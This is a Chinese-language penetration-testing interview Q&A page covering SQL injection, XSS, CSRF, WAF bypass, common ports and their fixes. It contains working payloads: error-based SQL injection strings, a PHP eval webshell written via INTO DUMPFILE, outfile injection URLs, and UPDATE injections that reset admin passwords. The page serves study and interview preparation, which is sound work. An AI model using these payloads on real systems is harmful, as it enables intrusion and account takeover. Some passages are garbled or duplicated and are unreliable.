<p>外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。修复⽅式：XML 解析库在调⽤时严格禁⽌对外部实体的解析。 </p>
<h4 id="35、CSRF、SSRF-和重放攻击有什么区别？"><a href="#35、CSRF、SSRF-和重放攻击有什么区别？" class="headerlink" title="35、CSRF、SSRF 和重放攻击有什么区别？"></a>35、CSRF、SSRF 和重放攻击有什么区别？</h4><p>CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进⾏ </p>
<p>重放，达到身份认证等⽬的</p>
<h4 id="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"><a href="#36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？" class="headerlink" title="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"></a>36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？</h4><p>密码找回漏洞中存在 </p>
<p>1）密码允许暴⼒破解、 </p>
<p>2）存在通⽤型找回凭证、 </p>
<p>3）可以跳过验证步骤、 </p>
<p>4）找回凭证可以拦包获取 </p>
<p>等⽅式来通过⼚商提供的密码找回功能来得到密码。身份认证漏洞中最常⻅的是 </p>
<p>1）会话固定攻击 </p>
<p>2） Cookie 仿冒 </p>
<p>只要得到 Session 或 Cookie 即可伪造⽤户身份。验证码漏洞中存在 </p>
<p>1）验证码允许暴⼒破解 </p>
<p>2）验证码可以通过 Javascript 或者改包的⽅法来进⾏绕过 </p>
<h4 id="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"></a>37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？</h4><p>get /ecskins/demo jsp?uid=2016031900&amp;keyword=”hello world”get /ecskins/demo.jsp?uid=2016031900&amp;keyword= hello world</p>
<p>HTTP/1.1Host:***.com:82User-Agent:Mozilla/</p>
<p>5.0 Firefox/40Accept:text/css,/;q=0.1</p>
<p>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3</p>
<p>Referer:http://<strong>***</strong>.com/eciop/orderForCC/</p>
<p>cgtListForCC.htm?zone=11370601&amp;v=145902</p>
<p>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;</p>
<p>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;</p>
<p>st_uid=N90PLYHLZGJXI-NX01VPUF46W;</p>
<p>status=True</p>
<p>Connection:keep-alive</p>
<p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p>
<p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p>
<p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p>
<h4 id="38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。"><a href="#38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。" class="headerlink" title="38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。"></a>38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。</h4><h4 id="39、sqlmap，怎么对⼀个注⼊点注⼊？"><a href="#39、sqlmap，怎么对⼀个注⼊点注⼊？" class="headerlink" title="39、sqlmap，怎么对⼀个注⼊点注⼊？"></a>39、sqlmap，怎么对⼀个注⼊点注⼊？</h4><p>1）如果是 get 型号，直接，sqlmap -u “诸如点⽹址”. </p>
<p>2) 如果是 post 型诸如点，可以 sqlmap -u “注⼊点⽹址” –data=”post 的参数 “ </p>
<p>3）如果是 cookie，X-Forwarded-For 等，可以访问的时候，⽤ burpsuite 抓包，注⼊处⽤号替换，放到⽂件⾥，然后 </p>
<p>sqlmap -r “⽂件地址” </p>
<h4 id="40、nmap，扫描的⼏种⽅式"><a href="#40、nmap，扫描的⼏种⽅式" class="headerlink" title="40、nmap，扫描的⼏种⽅式"></a>40、nmap，扫描的⼏种⽅式</h4><h4 id="41、sql-注⼊的⼏种类型？"><a href="#41、sql-注⼊的⼏种类型？" class="headerlink" title="41、sql 注⼊的⼏种类型？"></a>41、sql 注⼊的⼏种类型？</h4><p>1）报错注⼊ </p>
<p>2）bool 型注⼊ </p>
<p>3）延时注⼊ </p>
<p>4）宽字节注⼊ </p>
<h4 id="42、报错注⼊的函数有哪些？10-个"><a href="#42、报错注⼊的函数有哪些？10-个" class="headerlink" title="42、报错注⼊的函数有哪些？10 个"></a>42、报错注⼊的函数有哪些？10 个</h4><p>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】</p>
<p>2）通过floor报错 向下取整3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) </p>
<p>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)</p>
<p>b));</p>
<p>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));</p>
<p>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));</p>
<p>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));</p>
<p>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));</p>
<p>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));</p>
<p>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p>
<h4 id="43、延时注⼊如何来判断？"><a href="#43、延时注⼊如何来判断？" class="headerlink" title="43、延时注⼊如何来判断？"></a>43、延时注⼊如何来判断？</h4><p>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) </p>
<h4 id="44、盲注和延时注⼊的共同点？"><a href="#44、盲注和延时注⼊的共同点？" class="headerlink" title="44、盲注和延时注⼊的共同点？"></a>44、盲注和延时注⼊的共同点？</h4><p>都是⼀个字符⼀个字符的判断 </p>
<h4 id="45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms"><a href="#45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms" class="headerlink" title="45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms"></a>45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms</h4><p>漏洞，⽐如 dedecms 后台可以直接建⽴脚本⽂件，wordpress 上传插件包含脚本⽂件 zip 压缩包等 </p>
<h4 id="46、sql-注⼊写⽂件都有哪些函数？"><a href="#46、sql-注⼊写⽂件都有哪些函数？" class="headerlink" title="46、sql 注⼊写⽂件都有哪些函数？"></a>46、sql 注⼊写⽂件都有哪些函数？</h4><p>select ‘⼀句话’ into outfile ‘路径’</p>
<p>select ‘⼀句话’ into dumpfile ‘路径’</p>
<p>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’; </p>
<h4 id="47、如何防⽌-CSRF"><a href="#47、如何防⽌-CSRF" class="headerlink" title="47、如何防⽌ CSRF?"></a>47、如何防⽌ CSRF?</h4><p>1）验证 referer </p>
<p>2）验证 token </p>
<p>详细：<a target="_blank" rel="noopener" href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a> </p>
<h4 id="48、owasp-漏洞都有哪些？"><a href="#48、owasp-漏洞都有哪些？" class="headerlink" title="48、owasp 漏洞都有哪些？"></a>48、owasp 漏洞都有哪些？</h4><p>1）SQL 注⼊防护⽅法： </p>
<p>2）失效的身份认证和会话管理2）失效的身份认证和会话管理 </p>
<p>3）跨站脚本攻击 XSS </p>
<p>4）直接引⽤不安全的对象 </p>
<p>5）安全配置错误 </p>
<p>6）敏感信息泄露 </p>
<p>7）缺少功能级的访问控制 </p>
<p>8）跨站请求伪造 CSRF </p>
<p>9）使⽤含有已知漏洞的组件 </p>
<p>10）未验证的重定向和转发 </p>
<h4 id="49、SQL-注⼊防护⽅法？"><a href="#49、SQL-注⼊防护⽅法？" class="headerlink" title="49、SQL 注⼊防护⽅法？"></a>49、SQL 注⼊防护⽅法？</h4><p>1）使⽤安全的 API </p>
<p>2）对输⼊的特殊字符进⾏ Escape 转义处理 </p>
<p>3）使⽤⽩名单来规范化输⼊验证⽅法 </p>
<p>4）对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p>
<p>5）服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p>
<h4 id="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"><a href="#50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？" class="headerlink" title="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"></a>50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？</h4><p>1）代码执⾏：</p>
<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>2）⽂件读取：</p>
<p>file_get_contents(),highlight_file(),fopen(),read</p>
<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
<p>3)命令执⾏：</p>
<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<h4 id="51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h4><p>src 指定⼀个远程的脚本⽂件，获取 referer52、img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以. jpg 结尾，怎么获取管理员路径。 </p>
<p>1）远程服务器修改 apache 配置⽂件，配置. jpg ⽂件以 php ⽅式来解析 AddType application/x-httpd-php .jpg &lt;img </p>
<p>src=<a target="_blank" rel="noopener" href="http://xss.tv/1.jpg&gt;">http://xss.tv/1.jpg&gt;</a> 会以 php ⽅式来解析 </p>
<h4 id="53、为什么-aspx-⽊⻢权限⽐-asp-⼤？"><a href="#53、为什么-aspx-⽊⻢权限⽐-asp-⼤？" class="headerlink" title="53、为什么 aspx ⽊⻢权限⽐ asp ⼤？"></a>53、为什么 aspx ⽊⻢权限⽐ asp ⼤？</h4><p>aspx 使⽤的是. net 技术。IIS 中默认不⽀持，ASP 只是脚本语⾔⽽已。⼊侵的时候 asp 的⽊⻢⼀般是 guest 权限… </p>
<p>APSX 的⽊⻢⼀般是 users 权限。 </p>
<h4 id="54、如何绕过-waf？"><a href="#54、如何绕过-waf？" class="headerlink" title="54、如何绕过 waf？"></a>54、如何绕过 waf？</h4><p>⼤⼩写转换法 </p>
<p>⼲扰字符 /<em>!</em>/</p>
<p>编码 base64 unicode hex url ascll </p>
<p>复参数 </p>
<h4 id="55、如何向服务器写⼊-webshell？"><a href="#55、如何向服务器写⼊-webshell？" class="headerlink" title="55、如何向服务器写⼊ webshell？"></a>55、如何向服务器写⼊ webshell？</h4><p>各种上传漏洞</p>
<p>mysql具有写⼊权限,⽤sql语句写⼊shell</p>
<p>http put⽅法 </p>
<h4 id="56、渗透测试中常⻅的端⼝"><a href="#56、渗透测试中常⻅的端⼝" class="headerlink" title="56、渗透测试中常⻅的端⼝"></a>56、渗透测试中常⻅的端⼝</h4><p>a、web 类 (web 漏洞 / 敏感⽬录) 第三⽅通⽤组件漏洞 struts thinkphp jboss ganglia zabbix</p>
<p>80 web </p>
<p>80-89 web </p>
<p>8000-9090 web</p>
<p>b、数据库类 (扫描弱⼝令)1433 MSSQL </p>
<p>1521 Oracle </p>
<p>3306 MySQL </p>
<p>5432 PostgreSQL</p>
<p>c、特殊服务类 (未授权 / 命令执⾏类 / 漏洞)</p>
<p>443 SSL⼼脏滴⾎</p>
<p>873 Rsync未授权</p>
<p>5984 CouchDB <a target="_blank" rel="noopener" href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p>
<p>6379 redis未授权</p>
<p>7001,7002 WebLogic默认弱⼝令，反序列</p>
<p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</p>
<p>11211 memcache未授权访问</p>
<p>27017,27018 Mongodb未授权访问</p>
<p>50000 SAP命令执⾏</p>
<p>50070,50030 hadoop默认端⼝未授权访问 </p>
<p>d、常⽤端⼝类 (扫描弱⼝令 / 端⼝爆破)</p>
<p>21 ftp </p>
<p>22 SSH </p>
<p>23 Telnet </p>
<p>2601,2604 zebra路由，默认密码zebra</p>
<p>3389 远程桌⾯ </p>
<h5 id="ALL、端⼝合计详情"><a href="#ALL、端⼝合计详情" class="headerlink" title="ALL、端⼝合计详情"></a>ALL、端⼝合计详情</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line"></span><br><span class="line">22 SSH </span><br><span class="line"></span><br><span class="line">23 Telnet </span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line"></span><br><span class="line">80-89 web </span><br><span class="line"></span><br><span class="line">161 SNMP </span><br><span class="line"></span><br><span class="line">389 LDAP </span><br><span class="line"></span><br><span class="line">443 SSL⼼脏滴⾎以及⼀些web漏洞测试</span><br><span class="line"></span><br><span class="line">445 SMB 512,513,514 Rexec </span><br><span class="line"></span><br><span class="line">873 Rsync未授权</span><br><span class="line"></span><br><span class="line">1025,111 NFS </span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line"></span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"></span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"></span><br><span class="line">3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了</span><br><span class="line"></span><br><span class="line">3306 MySQL </span><br><span class="line"></span><br><span class="line">3312&#x2F;3311 kangle主机管理系统登陆</span><br><span class="line"></span><br><span class="line">3389 远程桌⾯</span><br><span class="line"></span><br><span class="line">4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹</span><br><span class="line"></span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">5900 vnc </span><br><span class="line"></span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line"></span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作为代理进⼊内⽹</span><br><span class="line"></span><br><span class="line">6379 redis未授权</span><br><span class="line"></span><br><span class="line">7001,7002 WebLogic默认弱⼝令，反序列</span><br><span class="line"></span><br><span class="line">7778 Kloxo主机控制⾯板登录</span><br><span class="line"></span><br><span class="line">8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上</span><br><span class="line"></span><br><span class="line">8080 tomcat&#x2F;WDCP主机管理系统，默认弱⼝令</span><br><span class="line"></span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"></span><br><span class="line">8083 Vestacp主机管理系统 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">8649 ganglia </span><br><span class="line"></span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端⼝</span><br><span class="line"></span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</span><br><span class="line"></span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</span><br><span class="line"></span><br><span class="line">11211 memcache未授权访问</span><br><span class="line"></span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line"></span><br><span class="line">28017 mongodb统计⻚⾯</span><br><span class="line"></span><br><span class="line">50000 SAP命令执⾏</span><br><span class="line"></span><br><span class="line">50070,50030 hadoop默认端⼝未授权访问 </span><br></pre></td></tr></table></figure>



<h3 id="三、深信服⼀⾯"><a href="#三、深信服⼀⾯" class="headerlink" title="三、深信服⼀⾯"></a>三、深信服⼀⾯</h3><p>了解哪些漏洞⽂件上传有哪些防护⽅式 </p>
<p>⽤什么扫描端⼝，⽬录 </p>
<p>如何判断注⼊ </p>
<p>注⼊有防护怎么办 </p>
<p>有没有写过 tamper </p>
<p>3306 1443 8080 是什么端⼝ </p>
<p>计算机⽹络从物理层到应⽤层 xxxx </p>
<p>有没有 web 服务开发经验 </p>
<p>如何向服务器写⼊ webshell </p>
<p>有没有⽤过 xss 平台 </p>
<p>⽹站渗透的流程 </p>
<p>mysql 两种提权⽅式（udf，？）</p>
<p>常⻅加密⽅式 xxx </p>
<p>ddos 如何防护 </p>
<p>有没有抓过包，会不会写 wireshark 过滤规则 </p>
<p>清理⽇志要清理哪些 </p>
<h4 id="四、SQL-注⼊防护"><a href="#四、SQL-注⼊防护" class="headerlink" title="四、SQL 注⼊防护"></a>四、SQL 注⼊防护</h4><p>1、使⽤安全的 API </p>
<p>2、对输⼊的特殊字符进⾏ Escape 转义处理 </p>
<p>3、使⽤⽩名单来规范化输⼊验证⽅法 </p>
<p>4、对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p>
<p>5、服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p>
<p>6、规范编码, 字符集 </p>
<h4 id="五、为什么参数化查询可以防⽌-SQL-注⼊"><a href="#五、为什么参数化查询可以防⽌-SQL-注⼊" class="headerlink" title="五、为什么参数化查询可以防⽌ SQL 注⼊"></a>五、为什么参数化查询可以防⽌ SQL 注⼊</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套 </p>
<p>⽤参数运⾏ </p>
<p>简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语 义跑</p>
<h4 id="六、SQL-头注⼊点"><a href="#六、SQL-头注⼊点" class="headerlink" title="六、SQL 头注⼊点"></a>六、SQL 头注⼊点</h4><p>UA</p>
<p>REFERER</p>
<p>COOKIE</p>
<p>IP</p>
<h4 id="七、盲注是什么？怎么盲注？"><a href="#七、盲注是什么？怎么盲注？" class="headerlink" title="七、盲注是什么？怎么盲注？"></a>七、盲注是什么？怎么盲注？</h4><p>盲注是在 SQL 注⼊攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注 </p>
<p>⼊和利⽤的⽅式。盲注的⼿段有两种，⼀个是通过⻚⾯的返回内容是否正确 (boolean-based)，来验证是否存在注⼊。</p>
<p>⼀个是通过 sql 语句处理时间的不同来判断是否存在注⼊ (time-based)，在这⾥，可以⽤ benchmark，sleep 等造成延 </p>
<p>时效果的函数，也可以通过构造⼤笛卡⼉积的联合查询表来达到延时的⽬的。 </p>
<h4 id="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"><a href="#⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理" class="headerlink" title="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"></a>⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理</h4><p>在数据库使⽤了宽字符集⽽ WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中⽐如 </p>
<p>addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进⾏转义，因此 0xbf27 会变成 0xbf5c27, ⽽数据进⼊</p>
<p>数据库中时，由于 0XBF5C 是⼀个另外的字符，因此 \ 转义符号会被前⾯的 bf 带着 “吃掉”，单引号由此逃逸出来可以 </p>
<p>⽤来闭合语句。 </p>
<p>2、在哪⾥编码 </p>
<p>3、根本原因 </p>
<p>character_set_client(客户端的字符集) 和 character_set_connection(连接层的字符集) 不同, 或转换函数如，iconv、 </p>
<p>mb_convert_encoding 使⽤不当。 </p>
<p>4、解决办法 </p>
<p>统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为 UTF-8。或对数据进⾏正确的转 </p>
<p>义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。 </p>
<p>5、SQL ⾥⾯只有 update 怎么利⽤ </p>
<p>先理解这句 SQL</p>
<p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’$id’</p>
<p>如果此 SQL 被修改成以下形式，就实现了注⼊ </p>
<p>a、修改 homepage 值为 <a target="_blank" rel="noopener" href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3</p>
<p>之后 SQL 语句变为UPDATE user SET password=’mypass’, homepage=’<a target="_blank" rel="noopener" href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3’ WHERE id=’$id’</p>
<p>userlevel 为⽤户级别 </p>
<p>b、修改 password 值为 mypass)’ WHERE username=’admin’#</p>
<p>之后 SQL 语句变为</p>
<p>UPDATE user SET password=’MD5(mypass)’ WHERE username=’admin’#)’, homepage=’$homepage’ WHERE id=’$id’</p>
<p>c、修改 id 值为 ‘ OR username=’admin’ 之后 SQL 语句变为</p>
<p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’’ OR username=’admin’</p>
<h4 id="九、SQL-如何写-shell-单引被过滤怎么办"><a href="#九、SQL-如何写-shell-单引被过滤怎么办" class="headerlink" title="九、SQL 如何写 shell / 单引被过滤怎么办"></a>九、SQL 如何写 shell / 单引被过滤怎么办</h4><p>写 shell: root 权限，GPC 关闭，知道⽂件路径 outfifile 函数</p>
<p>`<a target="_blank" rel="noopener" href="http://127.0.0.1:81/sqli.php?id=1">http://127.0.0.1:81/sqli.php?id=1</a> into outfile ‘C:\wamp64\www\phpinfo.php’ FIELDS TERMINATED BY ‘&lt;?php phpinfo</p>
<p>(); ?&gt;’`</p>
<p>`<a target="_blank" rel="noopener" href="http://127.0.0.1:81/sqli.php?id=-1">http://127.0.0.1:81/sqli.php?id=-1</a> union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile ‘C:\w</p>
<p>amp64\www\phpinfo.php’`</p>
<p>宽字节注⼊ </p>
<p>1、代替空格的⽅法</p>
<p>%0a、%0b、%a0 等</p>
<p>/**/ 等注释符</p>
<p>&lt;&gt;</p>
<p>2、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别 </p>
<p>5 0 以下没有 information schema 这个系统表 ⽆法列表名等 只能暴⼒跑表名。5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p>
<p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操做。 </p>
<h4 id="⼗、XSS"><a href="#⼗、XSS" class="headerlink" title="⼗、XSS"></a>⼗、XSS</h4><p>1、XSS 原理 </p>
<p>反射型 </p>
<p>⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。需要诱使⽤户 “点击” ⼀个恶意链接，才能攻击 </p>
<p>成功</p>
<p>存储型 </p>
<p>存储型 XSS 会把⽤户输⼊的数据 “存储” 在服务器端。这种 XSS 具有很强的稳定性。 </p>
<p>DOM 型</p>
<p>通过修改⻚⾯的 DOM 节点形成的 XSS，称之为 DOM Based XSS。 </p>
<p>2、DOM 型和反射型的区别 </p>
<p>反射型 XSS：通过诱导⽤户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 </p>
<p>payload 的链接时⻚⾯应该是会带有特定的畸形数据的。DOM 型：通过修改⻚⾯的 DOM 节点形成的 XSS。DOM- </p>
<p>based XSS 由于是通过 js 代码进⾏ dom 操作产⽣的 XSS，所以在请求的响应中我们甚⾄不⼀定会得到相应的畸形数 </p>
<p>据。根本区别在我看来是输出点的不同。 </p>
<p>3、DOM 型和 XSS ⾃动化测试或⼈⼯测试 </p>
<p>⼈⼯测试思路：找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript: </p>
<p>后内容、eval、setTimeout 、setInterval 等直接执⾏之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经 </p>
<p>过安全函数。⾃动化测试参看道哥的博客，思路是从输⼊⼊⼿，观察变量传递的过程，最终检查是否有在危险函数输 </p>
<p>出，中途是否有经过安全函数。但是这样就需要有⼀个 javascript 解析器，否则会漏掉⼀些通过 js 执⾏带⼊的部分内</p>
<p>容容。</p>
<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进⾏检测，对不同 </p>
<p>类型的 XSS 检测⽅式实际上并没有太过细分的标准化检测⽅式，所以回答的很烂。。。</p>
<p>4、如何快速发现 XSS 位置 </p>
<p>5、对于 XSS 怎么修补建议 </p>
<p>输⼊点检查：对⽤户输⼊的数据进⾏合法性检查，使⽤ fifilter 过滤敏感字符或对进⾏编码转义，针对特定类型数据进⾏格 </p>
<p>式检查。针对输⼊点的检查最好放在服务器端实现。 </p>
<p>输出点检查：对变量输出到 HTML ⻚⾯中时，对输出内容进⾏编码转义，输出在 HTML 中时，对其进⾏ </p>
<p>HTMLEncode，如果输出在 Javascript 脚本中时，对其进⾏ JavascriptEncode。对使⽤ JavascriptEncode 的变量都放 </p>
<p>在引号中并转义危险字符，data 部分就⽆法逃逸出引号外成为 code 的⼀部分。还可以使⽤更加严格的⽅法，对所有数</p>
<p>字字⺟之外的字符都使⽤⼗六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的</p>
<p>⽅式也需要考虑清楚，针对不同的输出点，我们防御 XSS 的⽅法可能会不同，这点可能在之后的⽂章会做下总结。 </p>
<p>除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。 </p>
<p>6、XSS 蠕⾍的⽣产条件 </p>
<p>正常情况下，⼀个是产⽣ XSS 点的⻚⾯不属于 self ⻚⾯，⽤户之间产⽣交互⾏为的⻚⾯，都可能造成 XSS Worm 的产 </p>
<p>⽣。</p>
<p>不⼀定需要存储型 XSS </p>
<h4 id="⼗⼀、CSRF"><a href="#⼗⼀、CSRF" class="headerlink" title="⼗⼀、CSRF"></a>⼗⼀、CSRF</h4><p>1、CSRF 原理 </p>
<p>CSRF 是跨站请求伪造攻击，由客户端发起, 是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认 </p>
<p>2、防御验证 Referer </p>
<p>添加 token </p>
<p>3、token 和 referer 做横向对⽐，谁安全等级⾼？ </p>
<p>token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并 </p>
<p>且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则) </p>
<p>4、对 referer 的验证，从什么⻆度去做？如果做，怎么杜绝问题</p>
<p>对 header 中的 referer 的验证，⼀个是空 referer，⼀个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的 </p>
<p>⽩名单中，正则规则应当写完善。 </p>
<p>5、针对 token, 对 token 测试会注意哪⽅⾯被⼈，会对 token 的哪⽅⾯进⾏测试？ </p>
<p>引⽤⼀段请教前辈的回答： </p>
<p>针对token的攻击，⼀是对它本身的攻击，重放测试⼀次性、分析加密规则、校验⽅式是否正确等，⼆是结合信息泄露漏洞对它的获取，结合着发起组合攻击 </p>
<p>信息泄露有可能是缓存、⽇志、get，也有可能是利⽤跨站 </p>
<p>很多跳转登录的都依赖token，有⼀个跳转漏洞加反射型跨站就可以组合成登录劫持了 </p>
